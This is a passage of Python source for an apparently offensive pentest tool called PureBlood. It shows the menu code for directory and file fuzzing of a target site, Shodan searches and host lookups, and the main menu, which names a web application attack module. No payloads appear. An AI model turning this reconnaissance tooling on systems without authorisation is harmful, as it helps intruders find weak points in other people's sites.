            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] Directory Fuzz Result - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('Response 200:\n')
        print ('[+] Response 200')
        for i in wp_directory_fuzz1:
            print (i)
            web_pentest_outputfile.write(i + '\n')
        web_pentest_outputfile.write('Response 301 / 302:\n')
        print ('[+] Response 301 / 302')
        for i in wp_directory_fuzz2:
            print (i)
            web_pentest_outputfile.write(i + '\n')
        web_pentest_outputfile.write('[+] Response 403:\n')
        print ('[+] Response 403')
        for i in wp_directory_fuzz3:
            print (i)
            web_pentest_outputfile.write(i + '\n')
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 15:
        if sys.version_info[0] == 3:
            file_list = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}FileFuzz{1}>({3}File List{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            file_list = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}FileFuzz{1}>({3}File List{1})> {2}'.format(green, blue, cyan, red)))
        try:
            wp_file_fuzz1, wp_file_fuzz2, wp_file_fuzz3 = cweb_pentest.file_fuzz(url, file_list)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] File Fuzz Result - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('Response 200:\n')
        print ('[+] Response 200')
        for i in wp_file_fuzz1:
            print (i)
            web_pentest_outputfile.write(i + '\n')
        web_pentest_outputfile.write('Response 301 / 302:\n')
        print ('[+] Response 301 / 302')
        for i in wp_file_fuzz2:
            print (i)
            web_pentest_outputfile.write(i + '\n')
        web_pentest_outputfile.write('Response 403:\n')
        print ('[+] Response 403')
        for i in wp_file_fuzz3:
            print (i)
            web_pentest_outputfile.write(i + '\n')
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 16:
        if sys.version_info[0] == 3:
            shodan_search_query = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Query{1})> {2}'.format(green, blue, cyan, red)))
            SHODAN_API_KEY = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Shodan API Key{1})> {2}'.format(green, blue, cyan, red)))
            shodan_search_output_filename = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Output{1})> {2}'.format(green, blue, cyan, red)))
            if '.txt' not in shodan_search_output_filename:
                shodan_search_output_filename = shodan_search_output_filename + '.txt'
            else:
                shodan_search_output_filename = shodan_search_output_filename
        if sys.version_info[0] == 2:
            shodan_search_query = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Query{1})> {2}'.format(green, blue, cyan, red)))
            SHODAN_API_KEY = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Shodan API Key{1})> {2}'.format(green, blue, cyan, red)))
            shodan_search_output_filename = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Output{1})> {2}'.format(green, blue, cyan, red)))
            if '.txt' not in shodan_search_output_filename:
                shodan_search_output_filename = shodan_search_output_filename + '.txt'
            else:
                shodan_search_output_filename = shodan_search_output_filename
        shodan_search_output = open('outputs/web_pentest/shodan/' + shodan_search_output_filename, 'a+')
        shodan_search_output.write('[#] - ' + month + ' ' + mday + ' ' + current_time + '\n')
        wp_shodan_search = cweb_pentest.shodan_search(shodan_search_query, SHODAN_API_KEY)
        print ('{0}='.format(red) * int(sizex))
        print (reset + bold)
        print ('------------------------------.\n{1}[{2}#{1}] {3}- {4}Results Found: {5}|\n------------------------------.{0}'.format(reset, blue, green, yellow, cyan, str(wp_shodan_search['total'])))
        shodan_search_output.write('\n------------------------------.\n[#] - Results Found: {5}|\n------------------------------.\n'.format(reset, blue, green, yellow, cyan, str(wp_shodan_search['total'])))
        for i in wp_shodan_search['matches']:
            try:
                print ("""{6}[{7}#{6}] {8}- {9}Timestamp:{10} {0}
{6}[{7}+{6}] {8}- {9}IP:{10} {1}
{6}[{7}+{6}] {8}- {9}Port:{10} {2}
{6}[{7}+{6}] {8}- {9}OS:{10} {3}
{6}[{7}+{6}] {8}- {9}Hostnames:{10} {4}
{6}[{7}+{6}] {8}- {9}Data:{10}
{5}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""".format(i['timestamp'], i['ip_str'], str(i['port']), i['os'], i['hostnames'], i['data'], blue, green, yellow, cyan, reset))
                shodan_search_output.write("""[#] - Timestamp: {0}
[+] - IP: {1}
[+] - Port: {2}
[+] - OS: {3}
[+] - Hostnames: {4}
[+] - Data:
{5}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n""".format(i['timestamp'], i['ip_str'], str(i['port']), i['os'], i['hostnames'], i['data'], blue, green, yellow, cyan, reset))
            except:
                pass
        shodan_search_output.write('\n\n')
        shodan_search_output.close()
        print ('\n[+] - Output saved in outputs/web_pentest/shodan/' + shodan_search_output_filename)
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest()
    elif choice == 17:
        if sys.version_info[0] == 3:
            shodan_host = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Host{1})> {2}'.format(green, blue, cyan, red)))
            SHODAN_API_KEY = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Shodan API Key{1})> {2}'.format(green, blue, cyan, red)))
            shodan_host_lookup_output_filename = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Output{1})> {2}'.format(green, blue, cyan, red)))
            if '.txt' not in shodan_host_lookup_output_filename:
                shodan_host_lookup_output_filename = shodan_host_lookup_output_filename + '.txt'
            else:
                shodan_host_lookup_output_filename = shodan_host_lookup_output_filename
        if sys.version_info[0] == 2:
            shodan_host = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Host{1})> {2}'.format(green, blue, cyan, red)))
            SHODAN_API_KEY = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Shodan API Key{1})> {2}'.format(green, blue, cyan, red)))
            shodan_host_lookup_output_filename = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Output{1})> {2}'.format(green, blue, cyan, red)))
            if '.txt' not in shodan_host_lookup_output_filename:
                shodan_host_lookup_output_filename = shodan_host_lookup_output_filename + '.txt'
            else:
                shodan_host_lookup_output_filename = shodan_host_lookup_output_filename
        shodan_host_lookup_output = open('outputs/web_pentest/shodan/' + shodan_host_lookup_output_filename, 'a+')
        shodan_host_lookup_output.write('[#] - ' + month + ' ' + mday + ' ' + current_time + '\n')
        wp_shodan_host_lookup = cweb_pentest.shodan_host_lookup(shodan_host, SHODAN_API_KEY)
        print ('{0}='.format(red) * int(sizex))
        print (reset + bold)
        print ("""--------------------------.\n{1}[{2}#{1}] {3}- {4}General Information:{0}|\n--------------------------.
{1}[{2}#{1}] {3}- {4}IP:{0} {5}
{1}[{2}#{1}] {3}- {4}Ports:{0} {6}
{1}[{2}#{1}] {3}- {4}Tags:{0} {7}
{1}[{2}#{1}] {3}- {4}City:{0} {8}
{1}[{2}#{1}] {3}- {4}Country:{0} {9}
{1}[{2}#{1}] {3}- {4}Organization:{0} {10}
{1}[{2}#{1}] {3}- {4}ISP:{0} {11}
{1}[{2}#{1}] {3}- {4}Last Update:{0} {12}
{1}[{2}#{1}] {3}- {4}Hostnames:{0} {13}
{1}[{2}#{1}] {3}- {4}ASN:{0} {14}
""".format(reset, blue, green, yellow, cyan, wp_shodan_host_lookup['ip_str'], str(wp_shodan_host_lookup['ports']).replace('[','').replace(']',''), str(wp_shodan_host_lookup['tags']).replace('[','').replace(']',''), wp_shodan_host_lookup.get('city', 'N/A'), wp_shodan_host_lookup.get('country_name', 'N/A'), wp_shodan_host_lookup.get('org', 'N/A'), wp_shodan_host_lookup.get('isp', 'N/A'), wp_shodan_host_lookup.get('last_update', 'N/A'), str(wp_shodan_host_lookup.get('hostnames', 'N/A')).replace('[','').replace(']',''), wp_shodan_host_lookup.get('asn', 'N/A')))
        shodan_host_lookup_output.write("""--------------------------.\n[#] - General Information:|\n--------------------------.
[#] - IP: {5}
[#] - Ports: {6}
[#] - Tags: {7}
[#] - City: {8}
[#] - Country: {9}
[#] - Organization: {10}
[#] - ISP: {11}
[#] - Last Update: {12}
[#] - Hostnames: {13}
[#] - ASN: {14}
""".format(reset, blue, green, yellow, cyan, wp_shodan_host_lookup['ip_str'], str(wp_shodan_host_lookup['ports']).replace('[','').replace(']',''), str(wp_shodan_host_lookup['tags']).replace('[','').replace(']',''), wp_shodan_host_lookup.get('city', 'N/A'), wp_shodan_host_lookup.get('country_name', 'N/A'), wp_shodan_host_lookup.get('org', 'N/A'), wp_shodan_host_lookup.get('isp', 'N/A'), wp_shodan_host_lookup.get('last_update', 'N/A'), str(wp_shodan_host_lookup.get('hostnames', 'N/A')).replace('[','').replace(']',''), wp_shodan_host_lookup.get('asn', 'N/A')))
        print ('------------------------.\n{1}[{2}#{1}] {3}- {4}Services / Banner:|\n------------------------.{0}'.format(reset, blue, green, yellow, cyan))
        shodan_host_lookup_output.write('\n------------------------.\n[#] - Services / Banner:|\n------------------------.\n'.format(reset, blue, green, yellow, cyan))
        for i in wp_shodan_host_lookup['data']:
            print ("""{1}[{2}#{1}] {3}- {4}Timestamp:{0} {5}
{1}[{2}+{1}] {3}- {4}Port:{0} {6}
{1}[{2}+{1}] {3}- {4}Transport:{0} {7}
{1}[{2}+{1}] {3}- {4}Data:{0}
{8}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""".format(reset, blue, green, yellow, cyan, i['timestamp'], i['port'], i['transport'], i['data']))
            shodan_host_lookup_output.write("""[#] - Timestamp: {5}
[+] - Port: {6}
[+] - Transport: {7}
[+] - Data:
{8}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n""".format(reset, blue, green, yellow, cyan, i['timestamp'], i['port'], i['transport'], i['data']))
        shodan_host_lookup_output.write('\n\n')
        shodan_host_lookup_output.close()
        print ('\n[+] - Output saved in outputs/web_pentest/shodan/' + shodan_host_lookup_output_filename)
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest()
    elif choice == 90:
        main()
    elif choice == 95:
        print ('{2}[{1}#{2}] {3}- {4}Please don\'t put "/" in the end of the Target.{0}'.format(reset, green, blue, yellow, cyan))
        if sys.version_info[0] == 3:
            target = str(input('{0}PureBlood{1}>{0}WebPentest{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            target = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))
        if '://' in target:
            ohostname = target.replace('https://', '').replace('http://', '')
        else:
            ohostname = target
        web_pentest_output = ohostname + '-' + month + mday + '.txt'
        web_pentest_outputfile = open('outputs/web_pentest/' + web_pentest_output, 'a+')
        web_pentest_outputfile.write('\n\n\n[#] - ' + month + ' ' + mday + ' ' + current_time + '\n')
        set_target(target, 1)
    elif choice == 99:
        print ('\n[+] - Output saved in outputs/web_pentest/' + web_pentest_output)
        print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
        sys.exit()
    else:
        print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid choice!{0}'.format(reset, red, blue, yellow))
        time.sleep(2)
        print ('')
        web_pentest()



def main():
    print ("""{3}[ {5}PureBlood Menu {3}]

    {2}01{3}) {5}Web Pentest / Information Gathering
    {2}02{3}) {5}Web Application Attack
    {2}03{3}) {5}Generator
    {2}99{3}) {5}Exit
{0}""".format(reset, red, green, blue, yellow, cyan))
    if sys.version_info[0] == 3:
        try:
            choice = int(input('{0}PureBlood{1}> {2}'.format(green, blue, cyan)))
        except KeyboardInterrupt:
            print ('\n\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        except ValueError:
            print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))
            time.sleep(2)
            print ('')
            main()
    elif sys.version_info[0] == 2:
        try:
            choice = int(raw_input('{0}PureBlood{1}> {2}'.format(green, blue, cyan)))
        except KeyboardInterrupt:
            print ('\n\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        except ValueError:
            print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))
            time.sleep(2)
            print ('')
            main()
    if choice == 1:
        web_pentest()
    elif choice == 2:
        web_application_attack()
    elif choice == 3:
        generator()
    elif choice == 99:
        print ('{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
        sys.exit()
    else:
        print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid choice!{0}'.format(reset, red, blue, yellow))
        time.sleep(2)
        print ('')
        main()



if __name__ == '__main__':
    create_directories()
    clear()
    banner()
    main()
